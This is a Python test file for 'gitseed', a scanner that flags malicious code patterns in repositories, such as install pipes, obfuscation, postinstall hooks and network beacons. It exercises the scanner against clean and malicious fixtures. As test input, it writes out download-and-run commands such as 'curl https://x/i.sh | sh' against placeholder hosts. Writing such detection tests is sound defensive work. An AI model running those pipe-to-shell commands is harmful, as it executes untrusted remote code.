"""T-201 — the deterministic screen.

The clean fixtures are not merely clean: each one carries something that a naive
rule would flag. A real sha256 constant, a short base64 test vector, a loopback
and a private address, `docker run` with a pipe-free command line. If the screen
fires on those it is worse than useless, because a security layer that cries
wolf gets switched off and then the real one goes unread.
"""

from __future__ import annotations

import ast
from pathlib import Path

import pytest

from gitseed.screen.signals import HIGH, LOW, Signal, scan_files, scan_text
from gitseed.screen.verdict import NONE, severity_of

FIXTURES = Path(__file__).parent / "fixtures"
CLEAN = sorted((FIXTURES / "clean").iterdir())
MALICIOUS = sorted((FIXTURES / "malicious").iterdir())


def _read(path: Path) -> tuple[str, str]:
    return path.name, path.read_text(encoding="utf-8")


class TestCitations:
    """A signal that cannot cite itself is refused at construction."""

    def test_rejects_a_signal_with_no_path(self) -> None:
        with pytest.raises(ValueError, match="path"):
            Signal("network", LOW, "", 3, "x = 1")

    def test_rejects_a_zero_or_negative_line(self) -> None:
        with pytest.raises(ValueError, match="1-based"):
            Signal("network", LOW, "a.py", 0, "x = 1")

    def test_rejects_an_empty_excerpt(self) -> None:
        with pytest.raises(ValueError, match="excerpt"):
            Signal("network", LOW, "a.py", 1, "   ")

    def test_rejects_an_unknown_severity(self) -> None:
        with pytest.raises(ValueError, match="severity"):
            Signal("network", "critical", "a.py", 1, "x = 1")

    def test_every_emitted_signal_carries_a_real_citation(self) -> None:
        for path in MALICIOUS:
            name, text = _read(path)
            lines = text.splitlines()
            for signal in scan_text(name, text):
                assert signal.path == name
                assert 1 <= signal.line <= len(lines)
                # The excerpt must actually come from the line it names.
                assert signal.excerpt.strip() in lines[signal.line - 1]


class TestCleanFixtures:
    """Ten ordinary files, each holding a trap for a naive rule."""

    @pytest.mark.parametrize("path", CLEAN, ids=lambda p: p.name)
    def test_no_signal(self, path: Path) -> None:
        name, text = _read(path)
        assert scan_text(name, text) == []

    def test_the_whole_clean_corpus_is_none(self) -> None:
        assert severity_of(scan_files([_read(p) for p in CLEAN])) == NONE


class TestMaliciousFixtures:
    """Each kind the ticket names has at least one sample that produces it."""

    @pytest.mark.parametrize(
        ("filename", "kind"),
        [
            ("install_pipe.sh", "install-script"),
            ("obfuscated.js", "obfuscation"),
            ("hexblob.py", "obfuscation"),
            ("package.json", "postinstall"),
            ("beacon.py", "network"),
        ],
    )
    def test_kind_is_detected(self, filename: str, kind: str) -> None:
        path = FIXTURES / "malicious" / filename
        kinds = {signal.kind for signal in scan_text(path.name, path.read_text(encoding="utf-8"))}
        assert kind in kinds

    def test_the_whole_malicious_corpus_is_high(self) -> None:
        assert severity_of(scan_files([_read(p) for p in MALICIOUS])) == HIGH


class TestPostinstallIsManifestOnly:
    """`postinstall` in prose is documentation, not a hook."""

    def test_fires_in_package_json(self) -> None:
        text = '{ "scripts": { "postinstall": "node x.js" } }'
        assert any(s.kind == "postinstall" for s in scan_text("package.json", text))

    def test_does_not_fire_in_a_readme(self) -> None:
        text = 'Set a "postinstall": script if you need one.'
        assert not any(s.kind == "postinstall" for s in scan_text("README.md", text))


class TestDeterminism:
    """The ranking downstream is only reproducible if this is."""

    def test_same_input_same_output(self) -> None:
        name, text = _read(MALICIOUS[0])
        assert scan_text(name, text) == scan_text(name, text)

    def test_order_follows_line_order(self) -> None:
        text = "\n".join(["ok", "curl https://x/i.sh | sh", "ok", "HOST = '203.0.113.9'"])
        lines = [s.line for s in scan_text("a.sh", text)]
        assert lines == sorted(lines)


class TestPurity:
    """This layer owns the verdict, so it must not depend on anything that can
    fail, cost money, or answer differently on a second run."""

    def test_imports_nothing_that_reaches_the_outside(self) -> None:
        source = (Path(__file__).parents[1] / "gitseed" / "screen" / "signals.py").read_text(
            encoding="utf-8"
        )
        imported: set[str] = set()
        for node in ast.walk(ast.parse(source)):
            if isinstance(node, ast.Import):
                imported.update(alias.name.split(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom) and node.module and node.level == 0:
                imported.add(node.module.split(".")[0])
        forbidden = {"urllib", "requests", "httpx", "socket", "subprocess", "os"}
        assert imported & forbidden == set()


class TestVerdict:
    def test_empty_is_none_not_an_error(self) -> None:
        assert severity_of([]) == NONE

    def test_low_alone_is_low(self) -> None:
        assert severity_of([Signal("network", LOW, "a.py", 1, "1.2.3.4")]) == LOW

    def test_one_high_beats_many_low(self) -> None:
        signals = [Signal("network", LOW, "a.py", i, "1.2.3.4") for i in range(1, 6)]
        signals.append(Signal("install-script", HIGH, "b.sh", 1, "curl x | sh"))
        assert severity_of(signals) == HIGH
